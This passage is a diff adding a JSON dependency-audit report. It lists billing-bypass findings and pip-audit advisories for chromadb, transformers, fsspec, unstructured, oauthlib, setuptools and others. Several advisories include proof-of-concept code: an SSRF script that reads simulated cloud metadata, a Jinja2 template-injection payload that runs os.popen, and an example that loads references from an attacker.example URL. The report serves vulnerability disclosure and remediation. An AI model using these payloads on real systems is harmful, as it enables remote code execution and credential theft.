@@ -1,0 +1,476 @@
+{
+	"baseline": "362350c5e0da8438c6b0fc8c2a3ff2a8efee35d2",
+	"provenance": [
+		"2026-10-13T16:25:35Z",
+		"362350c5e0da8438c6b0fc8c2a3ff2a8efee35d2",
+		"true",
+		"10.9.9",
+		"pip-audit 2.10.1",
+		"bandit 1.9.4",
+		"  python version = 3.11.17 (main, Oct  3 2026, 01:05:36) [Clang 22.1.3 ]",
+		"1.180.0",
+		"8.24.3",
+		"uv 0.12.23 (x86_64-unknown-linux-gnu)"
+	],
+	"findings": [
+		{
+			"id": "AAI-2026-105",
+			"severity": "high",
+			"conditional": true,
+			"status": "reproduced_unfixed",
+			"title": "Optional provider passthrough bypasses billing authorization"
+		},
+		{
+			"id": "AAI-2026-106",
+			"severity": "medium",
+			"status": "reproduced_unfixed",
+			"title": "Speech generation bypasses plan request limit"
+		}
+	],
+	"scans": {
+		"npm": {
+			"info": 0,
+			"low": 10,
+			"moderate": 20,
+			"high": 11,
+			"critical": 2,
+			"total": 43
+		},
+		"python": {
+			"distributions": 115,
+			"affected_packages": 6,
+			"advisory_entries": 12,
+			"packages": [
+				{
+					"name": "chromadb",
+					"version": "1.5.9",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45829", "GHSA-f4j7-r4q5-qw2c"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45829", "GHSA-f4j7-r4q5-qw2c"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-3814",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45833", "GHSA-36p7-vc44-83pf"],
+							"description": "A code injection vulnerability in version 0.4.17 or later of the ChromaDB Python project allows an authenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/default_tenant/databases/default_database/collections/{collection_id} if they have the UPDATE_COLLECTION permission."
+						},
+						{
+							"id": "PYSEC-2026-3815",
+							"fix_versions": [],
+							"aliases": ["GHSA-xph7-9rjv-w5fr", "CVE-2026-45831"],
+							"description": "The SimpleRBACAuthorizationProvider authorization provider in versions 0.5.0 or later of the ChromaDB Python project evaluates whether a user holds a given permission but never checks which tenant, database, or collection that permission applies to allowing users to perform cross tenant actions."
+						},
+						{
+							"id": "PYSEC-2026-3813",
+							"fix_versions": [],
+							"aliases": ["GHSA-2wm9-hf6c-p5cr", "CVE-2026-45830"],
+							"description": "A lack of authorization validation in version 0.4.17 or later of the ChromaDB Python project allows any authenticated users to arbitrarily read, write, update, or delete data in any tenant's collection regardless of which tenant they belong to."
+						}
+					]
+				},
+				{
+					"name": "transformers",
+					"version": "5.5.4",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3929",
+							"fix_versions": ["5.10.0"],
+							"aliases": ["CVE-2026-9856", "GHSA-xrqw-3rrv-vx5w"],
+							"description": "A vulnerability in huggingface/transformers versions < 5.10.0 allows an attacker to perform arbitrary file writes via path traversal. The issue resides in the `save_pretrained()` methods of `PreTrainedTokenizerBase` and `ProcessorMixin`, where keys from the `chat_template` dictionary are used directly as filenames without proper validation. An attacker can exploit this by publishing a malicious Hugging Face Hub repository with a crafted `tokenizer_config.json` file. When a victim downloads and saves the tokenizer or processor, the attacker-controlled keys can escape the intended save directory, enabling arbitrary file writes with attacker-controlled content. This vulnerability affects multiple processors inheriting from `ProcessorMixin`, including Idefics, Florence, Gemma, Phi, and Qwen-VL."
+						},
+						{
+							"id": "PYSEC-2026-4174",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-80047", "GHSA-x9r9-c232-4q39"],
+							"description": "A vulnerability in Hugging Face Transformers (versions 4.49.0, <= 5.8.1) allows remote Python files to be written to local disk without user consent when using GenerativePreTrainedModel.load_custom_generate(). The function fetches and caches a remote module file before performing the required trust_remote_code consent check, inverting the security model enforced by other code-loading paths (such as AutoConfig, AutoModel, and AutoTokenizer). As a result, attacker\u2011controlled Python code from custom_generate/generate.py is copied into the user\u2019s ~/.cache/huggingface/modules directory even if the user declines the trust prompt. Although execution is correctly gated, the file write is not reversible and can persist across sessions. This can lead to persistent, unauthorized files on disk and stale cache collisions where cached attacker code may later be executed during trusted model loads. The issue stems from an unconditional file write in dynamic_module_utils.py prior to any trust verification."
+						}
+					]
+				},
+				{
+					"name": "sentence-transformers",
+					"version": "5.5.1",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-4164",
+							"fix_versions": ["5.6.0"],
+							"aliases": ["GHSA-jhr6-gm9c-rqjv", "CVE-2026-68770"],
+							"description": "sentence-transformers contains a security control bypass vulnerability that allows attackers to achieve arbitrary code execution by exploiting a logic flaw in the import_module_class helper within sentence_transformers/util/misc.py, where the guard condition includes an 'or os.path.exists(model_name_or_path)' clause that satisfies the trust gate whenever the supplied path exists on the local filesystem, regardless of the trust_remote_code=False argument. Attackers who can control or influence the contents of a model directory on disk can place malicious Python files such as modeling_*.py referenced via modules.json, causing the code to execute at import time when an application loads the model with SentenceTransformer(path, trust_remote_code=False), bypassing the documented security contract and achieving code execution within the loading process."
+						}
+					]
+				},
+				{
+					"name": "accelerate",
+					"version": "1.13.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3804",
+							"fix_versions": [],
+							"aliases": ["GHSA-4j2p-28q2-5m79", "CVE-2026-69112"],
+							"description": "Hugging Face Accelerate through 1.14.0 contains a path traversal vulnerability in load_checkpoint_in_model and load_checkpoint_and_dispatch functions that fail to sanitize weight_map entries from sharded checkpoint indexes. Attackers can supply relative paths with ../ sequences or absolute paths to read arbitrary files, or point shard entries at named pipes to cause indefinite blocking and denial of service."
+						}
+					]
+				},
+				{
+					"name": "pyarrow",
+					"version": "20.0.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["GHSA-rgxp-2hwp-jwgg", "CVE-2026-25087"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)   2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						},
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["GHSA-rgxp-2hwp-jwgg", "CVE-2026-25087"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)  2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						}
+					]
+				},
+				{
+					"name": "unstructured",
+					"version": "0.22.31",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3930",
+							"fix_versions": ["0.24.0"],
+							"aliases": ["GHSA-4mvj-m6j5-pmf7", "CVE-2026-71428"],
+							"description": "### Summary  Server-Side Request Forgery in `unstructured`. The `url=` argument of `partition()`, `partition_html()`, and `partition_md()` is fetched via `requests.get()` with no host validation. The response body is returned as `Element` text, so this is a **full-read SSRF** \u2014 attackers reach loopback admin APIs, internal HTTP services, and cloud metadata endpoints, and read the response.   `unstructured` is the de facto URL ingestion layer for LangChain `UnstructuredURLLoader`, LlamaIndex `UnstructuredReader`, Chainlit, and many agent frameworks \u2014 secure defaults must live in the library, not in every downstream caller.  ### Details  Three sinks, all in `unstructured == 0.22.26` (verified on `main` at `199f255`):  - `unstructured/partition/auto.py:303` \u2014 `file_and_type_from_url()`, reached via `partition(url=\u2026)`. - `unstructured/partition/html/partition.py:160` \u2014 `partition_html(url=\u2026)`. Post-fetch `Content-Type` check runs after the request hits the target. - `unstructured/partition/md.py:96` \u2014 `partition_md(url=\u2026)`. No timeout (SSRF + slow-loris DoS).  None of `is_private`, `is_loopback`, `ipaddress`, `gethostbyname`, or `allow_redirects` appear in any of the three files. Three exploitation paths apply: direct private-IP target; redirect bypass (`allow_redirects=True` default); DNS rebinding (TOCTOU, closeable only by socket-pinning). Affected since `0.4.7` (Feb 2023) \u2014 ~219 releases, no validation ever introduced.  ### PoC  Local-only. `pip install unstructured==0.22.26 flask requests`.  `internal_server.py`:  ```python from flask import Flask, Response, jsonify app = Flask(__name__)  @app.route(\"/imds\") def imds(): return jsonify({\"AccessKeyId\": \"ASIA-FAKE\", \"SecretAccessKey\": \"FAKE/SECRET\"})  @app.route(\"/internal.html\") def html(): return Response(\"<html><body><p>SK_LEAK_42</p></body></html>\", mimetype=\"text/html\")  @app.route(\"/redir\") def redir(): return Response(\"\", 302, headers={\"Location\": \"http://127.0.0.1:9999/imds\"})  if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=9999) ```  `exploit.py` \u2014 uses the public top-level API:  ```python # Stub NLP helpers so the offline sandbox skips spaCy model download. # Does NOT affect the SSRF (which lives in the URL fetcher, before NLP). import unstructured.nlp.tokenize as _tk, unstructured.partition.text_type as _tt _tk.sent_tokenize = _tt.sent_tokenize = lambda t: [s for s in (t or \"\").split(\". \") if s] _tk.word_tokenize = _tt.word_tokenize = lambda t: (t or \"\").split() _tk.pos_tag       = _tt.pos_tag       = lambda t: [(w, \"NN\") for w in (t or \"\").split()]  from unstructured.partition.auto import partition L = \"http://127.0.0.1:9999\"  # A: partition(url=...) leaks internal HTML body assert \"SK_LEAK_42\" in \"\\n\".join(str(e) for e in partition(url=f\"{L}/internal.html\", languages=[\"eng\"])) # B: redirect bypass reaches simulated IMDS assert \"SecretAccessKey\" in \"\\n\".join(str(e) for e in partition(url=f\"{L}/redir\", languages=[\"eng\"])) print(\"PoC OK\") ```  In production the attacker substitutes `169.254.169.254`, `metadata.google.internal`, or any internal address.  ### Impact  Attacker capabilities:  - **Internal HTTP service read** \u2014 loopback admin consoles, internal Elasticsearch/Redis/Consul/etcd HTTP fronts, Kubernetes API server, social/internal microservices. This is the most broadly exploitable capability and is unaffected by any cloud-side hardening. - **Cloud instance metadata access** \u2014 reads metadata services that respond to unauthenticated GETs: GCP (`metadata.google.internal`), Azure IMDS, Oracle Cloud, DigitalOcean, and EC2 instances still configured for IMDSv1 (which remains widely deployed in older accounts and in services that do not enforce IMDSv2-only). EC2 instances configured as IMDSv2-only are not exposed to direct credential theft via this SSRF, since IMDSv2 requires a `PUT` for token acquisition; the SSRF still reaches the endpoint for reconnaissance and surface-mapping. - **Side-effecting GET endpoints** \u2014 magic-link consumers, job triggers, link-preview generators reachable on internal networks. - **Internal network reconnaissance** \u2014 connection success/failure timing and error messages serve as a port and service scanner."
+						}
+					]
+				}
+			]
+		},
+		"locked-python": {
+			"distributions": 256,
+			"affected_packages": 9,
+			"advisory_entries": 16,
+			"packages": [
+				{
+					"name": "accelerate",
+					"version": "1.13.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3804",
+							"fix_versions": [],
+							"aliases": ["GHSA-4j2p-28q2-5m79", "CVE-2026-69112"],
+							"description": "Hugging Face Accelerate through 1.14.0 contains a path traversal vulnerability in load_checkpoint_in_model and load_checkpoint_and_dispatch functions that fail to sanitize weight_map entries from sharded checkpoint indexes. Attackers can supply relative paths with ../ sequences or absolute paths to read arbitrary files, or point shard entries at named pipes to cause indefinite blocking and denial of service."
+						}
+					]
+				},
+				{
+					"name": "chromadb",
+					"version": "1.5.9",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["GHSA-f4j7-r4q5-qw2c", "CVE-2026-45829"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["GHSA-f4j7-r4q5-qw2c", "CVE-2026-45829"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-3814",
+							"fix_versions": [],
+							"aliases": ["GHSA-36p7-vc44-83pf", "CVE-2026-45833"],
+							"description": "A code injection vulnerability in version 0.4.17 or later of the ChromaDB Python project allows an authenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/default_tenant/databases/default_database/collections/{collection_id} if they have the UPDATE_COLLECTION permission."
+						},
+						{
+							"id": "PYSEC-2026-3815",
+							"fix_versions": [],
+							"aliases": ["GHSA-xph7-9rjv-w5fr", "CVE-2026-45831"],
+							"description": "The SimpleRBACAuthorizationProvider authorization provider in versions 0.5.0 or later of the ChromaDB Python project evaluates whether a user holds a given permission but never checks which tenant, database, or collection that permission applies to allowing users to perform cross tenant actions."
+						},
+						{
+							"id": "PYSEC-2026-3813",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45830", "GHSA-2wm9-hf6c-p5cr"],
+							"description": "A lack of authorization validation in version 0.4.17 or later of the ChromaDB Python project allows any authenticated users to arbitrarily read, write, update, or delete data in any tenant's collection regardless of which tenant they belong to."
+						}
+					]
+				},
+				{
+					"name": "fsspec",
+					"version": "2025.3.0",
+					"vulns": [
+						{
+							"id": "CVE-2026-104851",
+							"fix_versions": ["2026.6.0"],
+							"aliases": ["GHSA-27vj-qcqg-25rc"],
+							"description": "### Summary  `fsspec.implementations.reference.ReferenceFileSystem` parses a \"references\" JSON document (Kerchunk format) supplied either inline or via a URL. The parser renders fields from this JSON through **un-sandboxed** `jinja2.Template(...).render(...)` calls in three locations. An attacker who controls the JSON document \u2014 typically by hosting it at a URL that the victim opens with `fsspec.filesystem(\"reference\", fo=URL)` or via `xarray.open_dataset(\"reference://...\")` \u2014 achieves arbitrary Python code execution on the victim machine, before any data is read.  This mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359) in `llama-cpp-python`, where externally-sourced template strings were rendered with the default unrestricted Jinja2 environment.  ### Affected versions  All versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in commit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on the latest released version `2025.10.0`.  ### Affected sinks  All in `fsspec/implementations/reference.py`:  | Sink | Location | Trigger | |---|---|---| | A \u2014 `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` | | B \u2014 `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context | | C \u2014 `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |  Sink C is the most severe: it is reached unconditionally for any references JSON that includes a `gen` field.  The vulnerable code:  ```python # fsspec/implementations/reference.py # Sink A @lru_cache(1000) def _render_jinja(u):     return jinja2.Template(u).render(**self.templates)  # <- unsandboxed  # Sink B def _process_templates(self, tmp):     ...     for k, v in tmp.items():         if \"{{\" in v:             import jinja2             self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(                 temp                                       # <- unsandboxed             ).render(**kwargs)  # Sink C def _process_gen(self, gens):     ...     for pr in products:         import jinja2         key = jinja2.Template(gen[\"key\"]).render(**pr, **self.templates)        # <- unsandboxed         url = jinja2.Template(gen[\"url\"]).render(**pr, **self.templates)        # <- unsandboxed         if (\"offset\" in gen) and (\"length\" in gen):             offset = int(jinja2.Template(gen[\"offset\"]).render(...))            # <- unsandboxed             length = int(jinja2.Template(gen[\"length\"]).render(...))            # <- unsandboxed ```  ### Proof of concept (Sink C, minimal)  Save as `poc.py`:  ```python import http.server, json, socketserver, threading, time, fsspec from pathlib import Path  PAYLOAD = \"{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}\" REF = {     \"version\": 1, \"templates\": {}, \"refs\": {\"x\": \"x\"},     \"gen\": [{         \"key\": PAYLOAD + \"/{{ i }}\", \"url\": \"http://example.com/{{ i }}\",         \"offset\": \"0\", \"length\": \"0\", \"dimensions\": {\"i\": [0]},     }], }  body = json.dumps(REF).encode() class H(http.server.BaseHTTPRequestHandler):     def do_GET(self):         self.send_response(200); self.end_headers(); self.wfile.write(body)     def log_message(self, *a, **kw): pass  srv = socketserver.TCPServer((\"127.0.0.1\", 0), H) threading.Thread(target=srv.serve_forever, daemon=True).start() url = f\"http://127.0.0.1:{srv.server_address[1]}/refs.json\"  for p in Path(\"/tmp\").glob(\"fsspec_pwned_*\"): p.unlink() try:     fsspec.filesystem(\"reference\", fo=url) except Exception as e:     print(\"exception:\", e) srv.shutdown() time.sleep(0.3) print(\"markers:\", list(Path(\"/tmp\").glob(\"fsspec_pwned_*\"))) ```  Run:  ``` pip install fsspec aiohttp requests jinja2 python3 poc.py # \u2192 markers: [PosixPath('/tmp/fsspec_pwned_<user>')] ```  ### End-to-end via xarray (real-world consumer pathway)  ```python import xarray as xr ds = xr.open_dataset(     \"reference://\",     engine=\"zarr\",     backend_kwargs={         \"consolidated\": False,         \"storage_options\": {             \"fo\": \"http://attacker.example/refs.json\",             \"remote_protocol\": \"http\",         },     }, ) # RCE fires before any data is materialised. ```  ### Tested on  - fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14 - fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux  ### Impact  `fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk** format, widely used in the Pangeo / Earth-observation / climate data-science ecosystem to provide cloud-optimised views of HDF5 / NetCDF / GRIB archives hosted on object storage.  Realistic attack vectors:  - A user opens a community-shared Kerchunk catalogue link via xarray/dask. - A managed data-science platform (notebook server, batch job runner)   ingests user-submitted Kerchunk URLs. - A workflow downloads a catalogue from a bucket whose contents have   been tampered with (supply chain).  In every case, the victim performs no action beyond opening a \"reference filesystem\" \u2014 there is no documented expectation that a data catalogue can execute arbitrary Python code.  ### Suggested fix  Replace `jinja2.Template(...)` with a shared `jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This matches the post-incident hardening applied to `llama-cpp-python` after CVE-2024-34359.  ```python # At module top def _sandboxed_env():     import jinja2.sandbox     env = getattr(_sandboxed_env, \"_env\", None)     if env is None:         env = jinja2.sandbox.ImmutableSandboxedEnvironment()         _sandboxed_env._env = env     return env ```  Then in each sink, replace `jinja2.Template(s).render(...)` with `_sandboxed_env().from_string(s).render(...)`.  The legitimate Kerchunk template syntax (simple variable substitution like `{{ varname }}`) continues to work under the sandbox; only the SSTI gadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.) are refused with `jinja2.exceptions.SecurityError`.  A complete patch is available on request.  ### Credit  Reported by Dany.A"
+						}
+					]
+				},
+				{
+					"name": "oauthlib",
+					"version": "3.3.1",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-4114",
+							"fix_versions": ["4.0.0"],
+							"aliases": ["CVE-2026-49265", "GHSA-xpv3-w29h-x7cv"],
+							"description": "## Summary  A timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation  of the Authorization Code Grant flow. The `code_challenge_method_plain` function  uses Python's standard `==` operator for string comparison instead of a  constant-time comparison function, potentially allowing timing-based attacks.  ## Affected Component  - File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py` - Functions: `code_challenge_method_plain`, `code_challenge_method_s256` - Vulnerability Type: CWE-208 (Observable Timing Discrepancy)  ## Technical Details  Python's `==` operator uses short-circuit evaluation when comparing strings: 1. Returns `False` immediately if lengths differ 2. Compares characters left-to-right, stopping at first mismatch  This means comparison time varies linearly with the length of the common prefix  between the attacker-supplied verifier and the stored challenge, creating a  measurable timing oracle.  ## Proof of Concept  Tested locally against oauthlib source (network jitter eliminated to isolate  pure Python execution time):  | Input | Result | Time (10M iterations) | |---|---|---| | Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s | | 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s | | **Difference** | | **0.03741s** |  The ~37ms delta over 10M iterations corresponds to nanosecond-level differences  per call, which are statistically exploitable under controlled conditions.  ## Attack Scenario  1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking 2. PKCE blocks token request \u2014 attacker lacks `code_verifier` 3. Attacker sends repeated requests to `/token` endpoint measuring response times 4. Using timing oracle, attacker recovers `code_verifier` character by character 5. Attacker obtains Access Token \u2192 Account Takeover  > **Note:** Practical exploitability is limited due to the single-use nature of  > authorization codes and real-world network noise. However, the vulnerable  > pattern should be corrected as a defense-in-depth measure.  ## Recommended Fix  Replace `==` with `hmac.compare_digest()` for constant-time comparison:  cr: Elvin Latifli"
+						}
+					]
+				},
+				{
+					"name": "pyarrow",
+					"version": "20.0.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["GHSA-rgxp-2hwp-jwgg", "CVE-2026-25087"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)   2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						},
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["GHSA-rgxp-2hwp-jwgg", "CVE-2026-25087"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)  2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						}
+					]
+				},
+				{
+					"name": "sentence-transformers",
+					"version": "5.5.1",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-4164",
+							"fix_versions": ["5.6.0"],
+							"aliases": ["CVE-2026-68770", "GHSA-jhr6-gm9c-rqjv"],
+							"description": "sentence-transformers contains a security control bypass vulnerability that allows attackers to achieve arbitrary code execution by exploiting a logic flaw in the import_module_class helper within sentence_transformers/util/misc.py, where the guard condition includes an 'or os.path.exists(model_name_or_path)' clause that satisfies the trust gate whenever the supplied path exists on the local filesystem, regardless of the trust_remote_code=False argument. Attackers who can control or influence the contents of a model directory on disk can place malicious Python files such as modeling_*.py referenced via modules.json, causing the code to execute at import time when an application loads the model with SentenceTransformer(path, trust_remote_code=False), bypassing the documented security contract and achieving code execution within the loading process."
+						}
+					]
+				},
+				{
+					"name": "setuptools",
+					"version": "81.0.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3447",
+							"fix_versions": ["83.0.0"],
+							"aliases": ["BIT-setuptools-2026-59890", "GHSA-h35f-9h28-mq5c", "CVE-2026-59890"],
+							"description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. Prior to 83.0.0, FileList applied MANIFEST.in exclude, global-exclude, recursive-exclude, and prune directives by matching compiled glob patterns against on-disk file names without Unicode normalization, so on macOS APFS or HFS+ an NFD file name could bypass an NFC exclusion rule and be packed into a source distribution. This issue is fixed in version 83.0.0."
+						},
+						{
+							"id": "PYSEC-2026-3447",
+							"fix_versions": ["83.0.0"],
+							"aliases": ["BIT-setuptools-2026-59890", "GHSA-h35f-9h28-mq5c", "CVE-2026-59890"],
+							"description": "## Summary  When building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.  ## Details  File names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:  ```python # setuptools/command/egg_info.py  (FileList.global_exclude) def global_exclude(self, pattern):     match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD     return self._remove_files(match.match)                   # byte-level regex over raw os.walk names ```  A rule written NFC (`caf\u00e9` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`caf\u00e9` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.  A `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes\u2192str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.  ## Impact  `MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule \u2014 an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.  ## Proof of concept  With a project containing `MANIFEST.in`:  ``` global-include *.txt *.json global-exclude secret_caf\u00e9.txt    # rule saved NFC ```  and an on-disk file `secret_caf\u00e9.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped \u2014 isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.  ## Remediation  Normalize both the walked path and each `MANIFEST.in` pattern to a single 